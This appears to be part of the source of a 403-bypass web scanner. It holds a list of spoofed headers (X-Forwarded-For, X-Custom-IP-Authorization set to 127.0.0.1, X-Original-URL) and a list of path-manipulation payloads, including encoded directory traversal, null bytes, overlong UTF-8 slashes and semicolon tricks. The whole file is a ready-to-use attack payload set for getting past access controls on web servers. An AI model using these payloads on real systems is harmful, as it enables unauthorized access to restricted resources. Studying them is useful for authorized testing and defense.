userAgent = "BypassScanner/1.0 (SLIP403 AUTHORIZED ACCESS ONLY)"

headersList = [
    None,
    {"X-Original-URL": ""},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1:80"},
    {"X-rewrite-url": ""},
    {"X-Host": "127.0.0.1"},
    {"X-Forwarded-Host": "127.0.0.1"},
]

modifiers = [
    "",               # direct
    "/%2e",           # encoded dot
    "/.",             # dot suffix
    "//",             # double slash
    "/./",            # current dir
    "%20",            # space
    "%09",            # horizontal tab
    "?",              # query param
    ".html",          # HTML extension
    "/?anything",     # nonsense query
    "#",              # fragment
    "/*",             # wildcard
    ".php",           # PHP extension
    ".json",          # JSON extension
    "..;/",           # semi path trick
    ";/",             # trailing semi
    "%2f",            # encoded forward slash
    "%5c",            # encoded backslash
    "/..%00/",        # null byte slash trick
    "/%2e%2e%2f",     # encoded ../
    "/%2e%2e/",       # encoded directory up
    "/..%2f",         # half-encoded directory traversal
    "/.../",          # dot flooding
    "/%c0%af",        # overlong UTF-8 slash
    "/%ef%bc%8f",     # Unicode fullwidth slash
    "/.random",       # invalid suffix to break filters
    "/admin;/",       # semicolon mid-path
    "/..%2f/",        # alternate traversal
    "/.;",            # dot-semicolon
    "/...//",         # deep slash & dot spam
    "/%e5%98%8a%e5%98%8d",  # UTF-8 junk payload
]